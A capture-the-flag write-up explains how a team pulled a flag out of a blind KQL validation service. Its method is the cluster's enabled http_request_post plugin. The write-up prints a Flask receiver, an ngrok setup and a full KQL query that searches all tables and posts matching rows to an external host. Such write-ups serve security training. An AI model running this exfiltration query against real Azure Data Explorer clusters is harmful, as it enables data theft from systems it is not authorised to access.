# KQL Validation Service
Writeup by slayyy @ Dragonslayerz

__Lesson learned:__ Teamwork makes the dream work


### Introduction
The challenge presents a service that supposedly validates input KQL queries by executing them towards a ADX cluster, as per the description. The task was to find a vulnerability in this service, to find a flag within. The issue being, that the only output from the service was whether or not the query input vas "valid" or not (i.e. executed without throwing any errors). 

The web service presented three main pages
- `Home`, a page with some information about the service
- `Validate KQL`, a page with an input field and a button for validating said input
- `Cluster Policies`, a page presenting the option of fetching the policies related to the cluster

### Solution steps
Starting out by running some basic queries in parallel in my own ADX cluster and the validation service, and validating that it indeed seems to validate the needful. The essential question kept looming - how to get data out.

First idea was perhaps some command injection was possible, i.e. somehow do something with the "Cluster Policies" page function. Investigation into the source code showed that the button calls an API at `/api/cluster_policies` and does some presentation magic wrt. the visual display of the fetched policies. While one further approach could have been looking for other API endpoints, I discarded my idea about command injection.

The next approach was to actually look at the data presented on the mentioned page - why was it here? Never being aware of such policies, a quick glance was awarded to them.

After some reading, a `CTRL+F` of "http" gave 14 results on the page - 12 of them in the `.show cluster policy caching` with some URL regexes for some reason - but also _two_ in `.show plugins` results.

```json
...
  {
    "Description": "Version=2",
    "IsEnabled": true,
    "PluginName": "http_request"
  },
  {
    "Description": "Version=2",
    "IsEnabled": true,
    "PluginName": "http_request_post"
  },
...
```

Not being familiar with the plugins themselves, official docs indicated that they might be useful.

The next steps was preparing the data reception.

#### Receving data
**Setting Up ngrok Reverse Proxy**
Finally I had an excuse to check out ngrok in an effort to receive the data. For reasons unknown, we chose the 
`ngrok http 443`

**Creating the Flask Service**
    - We developed a simple Python Flask service to handle incoming requests and process the data.
    - Below is a basic example of the Flask service:

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_post():
    try:
        data = request.data  # Get the raw data
        if not data:
            raise ValueError("No data received")
        print(f"Received POST data: {data.decode('utf-8')}")  # Decode bytes to string for printing
        return "POST request received", 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": str(e)}), 400

@app.route('/', methods=['GET'], defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    return f'You want to access the path: /{path}'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443)
```

#### Exploiting the Vulnerability
While the plugins discovered were useful for accessing _statically_ defined URLs, and posting _statically_ defined data, exposing the result of an executed query was troublesome.


Luckily someone has written about it at some point, and thanks to a [Cameron Fuller at quisitive](https://quisitive.com/overcoming-the-expression-must-be-a-constant-limit-in-kusto/) a bypass of the "static" requirements to the different parameters was achieved - the solution is basically to wrap the plugin into a function, and define the data as a variable, and then pass it through the function into the plugin. Easy as pie.

### Payload

Initially, with a imprecise "payload" (or query, if you will) the response was the red herring result, as seen below.

Response: `127.0.0.1 - - [02/Nov/2024 16:16:28] "POST / HTTP/1.1" 200 -
Received POST data: `
```json
{
    "$table": "Devices",
    "DeviceID": "0b86cce0-bae4-48d5-a76d-e382b1bd02b6",
    "DeviceName": "EPT{b9f6",
    "DeviceType": "Smartphone",
    "LastSeen": "2024-04-10T23:48:17.7197370Z",
    "StartTime": null,
    "EndTime": null,
    "EpisodeId": null,
    "EventId": null,
    "State": "",
    "EventType": "",
    "InjuriesDirect": null,
    "InjuriesIndirect": null,
    "DeathsDirect": null,
    "DeathsIndirect": null,
    "DamageProperty": null,
    "DamageCrops": null,
    "Source": "",
    "BeginLocation": "",
    "EndLocation": "",
    "BeginLat": null,
    "BeginLon": null,
    "EndLat": null,
    "EndLon": null,
    "EpisodeNarrative": "",
    "EventNarrative": "",
    "StormSummary": null
}
```

However, after a great input from a teammate who was looking at the KQL game challenge, suggested the following query:

`where * matches regex @"^EPT{.*}$"`

It is a regex pattern that matches any string starting with `EPT{`, followed by any sequence of characters, and ends with a closing brace `}`. 


This led to the following successful "payload" - go teamwork!

```sql
let content =  search * | where * matches regex @"^EPT{.*}$"  | project pack_all = tostring(pack_all());
let uri = "https://<ngrok-server>.ngrok-free.app";
let headers = dynamic({});
let options = dynamic({});
let content2 = tostring(toscalar(content));
let request = (uri:string, headers:dynamic, options:dynamic, json:string) {
    evaluate http_request_post(uri, request_headers=headers,options, json)
};
request(uri, headers, options, content2)
```


This indeed gave the flag in the `DeviceName` column in the response! 

```json
{
    "$table": "Devices",
    "DeviceID": "aee9635f-d3b4-4c37-89fb-293820ffb03b",
    "DeviceName": "EPT{6X+Jd$>this_is_A_v3ry_long_fl4g_d0nt_try_to_brute_force_itt=B+----J-P.=pEv'GvAJ$aFdyRia.<i<N/7-Ymes3dU2Kjl'MrYM7-FHNDFf'UNZ'hq1n1Mveb'RCyEX'MlJ2kK,b,:Zn'>ABjwgv_7'j7''FY*I'JI,z@K1dvPLE@>R9!6x3O4hYG_5!/HnD/gt_g::S9'IgD'5@vbBfAcUOrv'u<4O=$,'IE./=DY$RX}",
    "DeviceType": "Smartphone",
    "LastSeen": "2024-09-23T15:55:09.8931430Z",
    "StartTime": null,
    "EndTime": null,
    "EpisodeId": null,
    "EventId": null,
    "State": "",
    "EventType": "",
    "InjuriesDirect": null,
    "InjuriesIndirect": null,
    "DeathsDirect": null,
    "DeathsIndirect": null,
    "DamageProperty": null,
    "DamageCrops": null,
    "Source": "",
    "BeginLocation": "",
    "EndLocation": "",
    "BeginLat": null,
    "BeginLon": null,
    "EndLat": null,
    "EndLon": null,
    "EpisodeNarrative": "",
    "EventNarrative": "",
    "StormSummary": null
}
```

## Conclusion
By leveraging the cluster settings, setting up an ngrok reverse proxy, and creating a simple Flask service, we successfully identified and exploited a vulnerability in the KQL validation service.


## Tools Used
- ngrok
- Python Flask
- Google